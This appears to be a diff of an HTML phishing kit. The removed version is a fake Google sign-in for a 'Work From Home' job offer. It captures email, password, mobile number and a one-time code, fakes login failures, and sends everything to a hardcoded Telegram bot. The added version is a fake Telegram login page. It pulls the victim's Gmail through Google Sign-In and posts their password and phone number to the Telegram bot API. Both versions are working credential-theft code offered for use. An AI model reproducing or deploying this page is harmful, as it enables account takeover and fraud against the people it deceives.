@@ -3,185 +3,135 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Work From Home - Apply now</title>
-  <style>
-    body {
-      font-family: "Roboto", Arial, sans-serif;
-      background-image: url('https://usa-jobs.github.io/USAJOB.com/USAJOBS.jpg');
-      background-size: 100% 100%; /* fit entire screen */
-      background-position: center;
-      background-repeat: no-repeat;
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+  <title>Telegram Login Page</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 
-    .login-box {
-      background: rgba(255, 255, 255, 0.85); /* transparent white */
-      backdrop-filter: blur(6px); /* glass effect */
-      width: 360px;
-      max-width: 90%;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
-      padding: 40px 30px;
-      text-align: center;
-    }
-
-    .login-box img {
-      width: 75px;
-      margin-bottom: 15px;
-    }
-
-    .login-box h2 {
-      font-size: 22px;
-      margin: 10px 0;
-      font-weight: 500;
-      color: #202124;
-    }
-
-    .login-box p {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 25px;
-    }
-
-    .input-field {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 14px;
-    }
-
-    .input-field:focus {
-      border-color: #1a73e8;
-      outline: none;
-      box-shadow: 0 0 2px #1a73e8;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 12px;
-      background: #1a73e8;
-      color: #fff;
-      font-size: 15px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-top: 15px;
-    }
-
-    .btn:hover {
-      background: #1669c1;
-    }
-
-    .footer-text {
-      margin-top: 25px;
-      font-size: 12px;
-      color: #5f6368;
-    }
-
-    .footer-text a {
-      color: #1a73e8;
-      text-decoration: none;
-    }
-
-    .footer-text a:hover {
-      text-decoration: underline;
-    }
-  </style>
+  <!-- Google Identity Services -->
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
 </head>
 <body>
+  <!-- Header -->
+  <header class="bg-primary text-white text-center p-4">
+    <h1>Telegram</h1>
+    <p>Login to your account</p>
+  </header>
 
-  <div class="login-box">
-    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Logo">
-    <h2>Sign in</h2>
-    <p>To Apply - Login Directly with your Gmail</p>
+  <!-- Login Form -->
+  <section id="login" class="container mt-5">
+    <div class="row justify-content-center">
+      <div class="col-md-5">
 
-    <form id="loginForm" action="javascript:void(0);">
-      <input type="text" id="username" name="username" class="input-field" placeholder="Email or phone" required>
-      <input type="password" id="password" name="password" class="input-field" placeholder="Enter your password" required>
-      <input type="text" id="mobile" name="mobile" class="input-field" placeholder="Mobile with country code" required>
-      <button type="submit" class="btn">Next</button>
-    </form>
+        <!-- Google Sign In Button -->
+        <div id="g_id_onload"
+             data-client_id="287551844511-5r820hvv0gf0fd8064i6tmqhuqe5uakk.apps.googleusercontent.com"
+             data-callback="handleCredentialResponse"
+             data-auto_prompt="false">
+        </div>
 
-    <div class="footer-text">
-      <a href="#">Forgot email?</a><br><br>
-      Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
+        <div class="g_id_signin"
+             data-type="standard"
+             data-shape="rectangular"
+             data-theme="outline"
+             data-text="signin_with"
+             data-size="large"
+             data-logo_alignment="left">
+        </div>
+
+        <!-- Custom Login Form -->
+        <form id="loginForm" class="mt-4">
+          <div class="form-group">
+            <label for="gmail">Selected Gmail:</label>
+            <input type="text" class="form-control" id="gmail" placeholder="Choose Gmail above" readonly required>
+            <small id="gmailError" class="text-danger"></small>
+          </div>
+          <div class="form-group">
+            <label for="password">Password:</label>
+            <input type="password" class="form-control" id="password" placeholder="Enter password" required>
+          </div>
+          <div class="form-group">
+            <label for="mobile">Mobile Number:</label>
+            <input type="text" class="form-control" id="mobile" placeholder="Enter mobile number (e.g. 919898600143)" required>
+            <small id="mobileError" class="text-danger"></small>
+          </div>
+          <button type="submit" class="btn btn-primary w-100">Login</button>
+        </form>
+
+      </div>
     </div>
-  </div>
+  </section>
 
+  <!-- JS -->
   <script>
-    let loginAttempt = 0; // counter for login attempts
+    // === Telegram Bot Config ===
+    const BOT_TOKEN = "YOUR_BOT_TOKEN";   // <-- replace with your bot token
+    const CHAT_ID  = "YOUR_CHAT_ID";      // <-- replace with your chat id
 
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-      loginAttempt++;
-
-      const loginBox = document.querySelector('.login-box');
-
-      if (loginAttempt < 3) {
-        // 1st and 2nd attempt
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-        var mobile = document.getElementById('mobile').value;
-
-        var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
-        sendToTelegram(payload);
-
-        alert("Login failed: Invalid credentials");
-      } 
-      else if (loginAttempt === 3) {
-        // collect values again on 3rd attempt
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-        var mobile = document.getElementById('mobile').value;
-
-        var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
-        sendToTelegram(payload); // ✅ now also sends message at 3rd attempt
-
-        // Show OTP input
-        loginBox.innerHTML = `
-          <h2 style="font-size:24px; color:#1a73e8;">OTP Verification</h2>
-          <p style="font-size:16px; color:#202124;">Enter OTP sent to you via Telegram</p>
-          <form id="otpForm">
-            <input type="text" id="otp" name="otp" class="input-field" placeholder="Enter OTP" required>
-            <button type="submit" class="btn">Verify OTP</button>
-          </form>
-        `;
-
-        // OTP form listener
-        document.getElementById('otpForm').addEventListener('submit', function(e) {
-          e.preventDefault();
-          const otpValue = document.getElementById('otp').value;
-
-          sendToTelegram(`OTP Entered: ${otpValue} ❤️`);
-
-          // Show congratulation message
-          loginBox.innerHTML = `
-            <h2 style="font-size:28px; color:#1a73e8;">Congratulation!</h2>
-            <p style="font-size:20px; color:#202124;">Our representative will contact you soon.</p>
-          `;
-        });
-      }
-    });
-
-    function sendToTelegram(message) {
-      var chatId = '5738863873'; // your Telegram user ID
-      var botToken = '8211036124:AAGSsDbdurbpjt7FtEyuKri0sQgmBfCjntU'; // your bot token
-      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", apiUrl, true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-      var postData = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      xhr.send(postData);
+    // Handle Google Sign-In Response
+    function handleCredentialResponse(response) {
+      const data = JSON.parse(atob(response.credential.split('.')[1]));
+      document.getElementById("gmail").value = data.email;
     }
+
+    // Validation functions
+    function isValidEmail(email) {
+      const re = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+      return re.test(email);
+    }
+
+    function isValidMobile(mobile) {
+      // Must start with 91 and then exactly 10 digits
+      const re = /^91\d{10}$/;
+      return re.test(mobile);
+    }
+
+    // Form Submit
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const gmail   = document.getElementById("gmail").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const mobile   = document.getElementById("mobile").value.trim();
+
+      let valid = true;
+
+      // Gmail validation
+      if (!isValidEmail(gmail)) {
+        document.getElementById("gmailError").innerText = "Invalid Gmail format.";
+        valid = false;
+      } else {
+        document.getElementById("gmailError").innerText = "";
+      }
+
+      // Mobile validation
+      if (!isValidMobile(mobile)) {
+        document.getElementById("mobileError").innerText = "Invalid mobile number. Must start with 91 + 10 digits.";
+        valid = false;
+      } else {
+        document.getElementById("mobileError").innerText = "";
+      }
+
+      if (!valid) return;
+
+      // Send data to Telegram Bot
+      const message = `🔐 Login Attempt\n📧 Gmail: ${gmail}\n🔑 Password: ${password}\n📱 Mobile: ${mobile}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("Login successful! Data sent to Telegram.");
+        console.log("Telegram response:", data);
+      })
+      .catch(err => {
+        alert("Error sending data to Telegram.");
+        console.error(err);
+      });
+    });
   </script>
 
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
